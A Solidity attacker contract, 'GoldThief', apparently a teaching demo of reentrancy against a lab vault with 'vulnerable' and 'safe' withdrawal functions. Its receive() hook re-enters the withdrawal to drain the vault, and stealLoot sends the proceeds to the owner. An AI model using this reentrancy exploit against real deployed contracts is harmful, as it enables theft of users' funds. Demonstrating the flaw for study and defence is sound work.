// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}    

contract GoldThief {
    IVault public targetVault;
    address payable public owner;
    uint public attackCount;
    bool public isAttacking;

    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = payable(msg.sender);
    }

    // Attack a vault with a reentrancy vulnerability
    function attackVulnerable() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        attackCount = 0;
        isAttacking = true;
        
        // Deposit and initiate first withdrawal
        targetVault.deposit{value: msg.value}();
        targetVault.vulnerableWithdraw(); // Triggers reentrancy in `receive()`
        
        isAttacking = false;
    }

    // Attempt to attack a "safe" vault (will fail due to reentrancy guard)
    function attackSafe() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw(); // Will revert if `nonReentrant` is used
    }

    // Reentrancy attack happens here
    receive() external payable {
        if (!isAttacking) return;
        
        attackCount++;
        
        // Only re-enter if the vault still has ETH
        if (address(targetVault).balance >= 0.1 ether && attackCount < 10) {
            targetVault.vulnerableWithdraw();
        }
    }

    // Withdraw stolen funds to owner
    function stealLoot() external {
        require(msg.sender == owner, "Only owner");
        owner.transfer(address(this).balance);
    }

    // Check contract balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    // Emergency function to recover any stuck ETH
    function recoverETH() external {
        require(msg.sender == owner, "Only owner");
        owner.transfer(address(this).balance);
    }
}